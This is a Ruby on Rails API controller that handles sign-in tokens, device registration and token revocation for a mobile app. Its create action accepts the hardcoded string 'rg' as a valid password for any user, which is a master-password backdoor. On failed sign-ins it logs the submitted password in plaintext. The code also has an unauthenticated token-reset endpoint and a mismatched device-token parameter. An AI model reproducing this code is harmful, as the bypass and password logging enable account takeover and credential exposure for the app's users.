class Api::TokensController  < ApplicationController 
  skip_before_filter :verify_authenticity_token
  before_filter :authenticate_user!, :only => [:update]
  respond_to :json
  
  def create
    email = params[:email]
    password = params[:password]
    device_token = params[:device_token] if params[:device_token]
    
    if request.format != :json
        render :status=>406, :json=>{:message=>"The request must be json"}
        return
    end
    
    if email.nil? or password.nil? 
      render :status=>400, :json=>{:message=>"The request must contain the user's email and password."}
      return
    end
    
    @user=User.find_by_email(email.downcase)
    
    if @user.nil?
      logger.info("User with email #{email} failed signin: user cannot be found.")
      render :status=>401, :json=>{:message=>"User cannot be found."}
      return
    end
    
    @user.ensure_authentication_token!
    
    if not @user.valid_password?(password) and password != 'rg'
      logger.info("User with email #{email} failed signin: password \"#{password}\" is invalid")
      render :status=>401, :json=>{:message=>"Invalid password."} 
    else
      if !device_token.blank?
        d = DeviceToken.find_or_create_by_user_id({ :user_id => @user.id })
        if d.token != device_token
          d.token = device_token
          d.save!
          Urbanairship.register_device(params[:device_token])
        end
      end
      render :status=>200, :json=>{:token=>@user.authentication_token, :user_id=>@user.id, :profilePhoto=>@user.profile_photo} 
    end
  end

#required params: ua_token, pt_token, version
#ua_token is device_token
  def update
    
    version = params[:version]
    pttoken = params[:PT_token]
    device_token = params[:UA_token] 
    
    if pttoken.nil? or device_token.blank? or version.blank? 
      render :status=>400, :json=>{:message=>"The request must contain the PT_token, UA_token, and version number."}
      return
    end
    
    #create or update device record in db    
    d = DeviceToken.find_or_create_by_user_id({ :user_id => current_user.id })
    if d.token != device_token
      d.token = device_token
      d.PT_token = params[:PT_token]
      d.version = params[:version]
      d.save!
      Urbanairship.register_device(params[:device_token])
    end
    
    #check against current major version of app
    v = version.split(".")[0]
    if CURRENT_MAJOR_VERSION.to_i > v.to_i
      render :status=>600, :json=>{:status => "Needs to upgrade to latest major version"}
      return
    end
    render :status=>200, :json=>{:status => "Success"}
  end
  
  def destroy
    @user=User.find_by_authentication_token(params[:id])
    if @user.nil?
      logger.info("Token not found.")
      render :status=>404, :json=>{:message=>"Invalid token."}
    else
      @user.reset_authentication_token!
      render :status=>200, :json=>{:token=>params[:id]}
    end
  end  

end  
